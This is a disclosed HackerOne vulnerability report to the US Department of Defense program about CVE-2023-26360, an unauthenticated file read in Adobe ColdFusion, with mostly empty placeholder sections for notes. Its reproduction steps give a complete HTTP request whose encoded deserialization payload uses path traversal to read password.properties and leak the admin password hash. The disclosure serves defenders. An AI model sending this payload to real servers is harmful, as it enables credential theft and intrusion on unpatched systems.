---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '2248781'
original_report_id: '2248781'
title: Unauthenticated File Read Adobe ColdFusion
weakness: Improper Access Control - Generic
team_handle: deptofdefense
created_at: '2023-11-11T17:02:47.184Z'
disclosed_at: '2023-12-21T17:33:42.175Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 6
tags:
- hackerone
- improper-access-control-generic
---

# Unauthenticated File Read Adobe ColdFusion

## Metadata

- HackerOne Report ID: 2248781
- Weakness: Improper Access Control - Generic
- Program: deptofdefense
- Disclosed At: 2023-12-21T17:33:42.175Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Unauthenticated Arbitrary File Read vulnerability due to de serialization of untrusted data in Adobe ColdFusion.

## Impact

The impact of this vulnerability could result in unauthorized access to sensitive data and actions within the affected Adobe ColdFusion instances.

## System Host(s)
█████████

## Affected Product(s) and Version(s)
The vulnerability affects ColdFusion 2021 Update 5 and earlier as well as ColdFusion 2018 Update 15 and earlier

## CVE Numbers
CVE-2023-26360

## Steps to Reproduce
POST /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=wizardHash&_cfclient=true&returnFormat=wddx&inPassword=foo HTTP/1.1
Host: ███
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Connection: close
Content-Length: 121
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate, br

_variables=%7b%22_metadata%22%3a%7b%22classname%22%3a%22i/../lib/password.properties%22%7d%2c%22_variables%22%3a%5b%5d%7d

Password hash is disclosed in the response:

## Suggested Mitigation/Remediation Actions
Apply the necessary security patches or updates provided by Adobe to fix the vulnerability.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
